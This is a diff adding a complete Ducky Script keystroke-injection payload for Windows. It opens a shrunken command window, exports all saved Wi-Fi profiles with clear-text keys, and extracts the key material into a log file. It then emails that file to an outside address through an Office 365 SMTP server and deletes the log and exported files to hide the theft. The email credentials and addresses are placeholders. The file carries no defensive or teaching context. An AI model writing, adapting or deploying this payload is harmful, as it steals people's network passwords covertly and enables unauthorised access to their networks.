@@ -1,0 +1,47 @@
+DELAY 2000
+WINDOWS d
+WINDOWS r
+DELAY 1000
+STRING cmd /k mode con: cols=15 lines=1
+ENTER
+DELAY 1000
+STRING cd %temp%
+ENTER
+DELAY 1000
+STRING netsh wlan export profile key=clear
+DELAY 1000
+ENTER
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Log.txt
+DELAY 500
+ENTER
+STRING powershell
+ENTER
+STRING $SMTPServer = 'smtp.office365.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('login email', 'password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'email-from'
+ENTER
+STRING $ReportEmail.To.Add('send-to-email')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi'
+ENTER
+STRING $ReportEmail.Body = 'The log is attached!' 
+ENTER
+STRING $ReportEmail.Attachments.Add('Log.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+STRING exit
+ENTER
+STRING del Log.txt
+ENTER
+DELAY 500
+STRING del Wi*.xml & exit
+ENTER
